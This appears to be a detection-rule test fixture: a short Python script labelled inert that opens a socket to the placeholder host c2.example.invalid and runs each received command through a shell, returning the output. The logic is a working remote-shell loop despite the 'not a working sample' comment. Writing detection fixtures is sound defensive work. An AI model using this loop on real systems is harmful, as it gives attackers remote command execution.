#!/usr/bin/python3
# Inert YARA fixture for CERBER_MacOS_Python_Subprocess_Socket - text only, not a working sample.
import socket, subprocess
s = socket.socket()
s.connect(("c2.example.invalid", 8080))
while True:
    cmd = s.recv(1024).decode()
    out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    s.send(out)
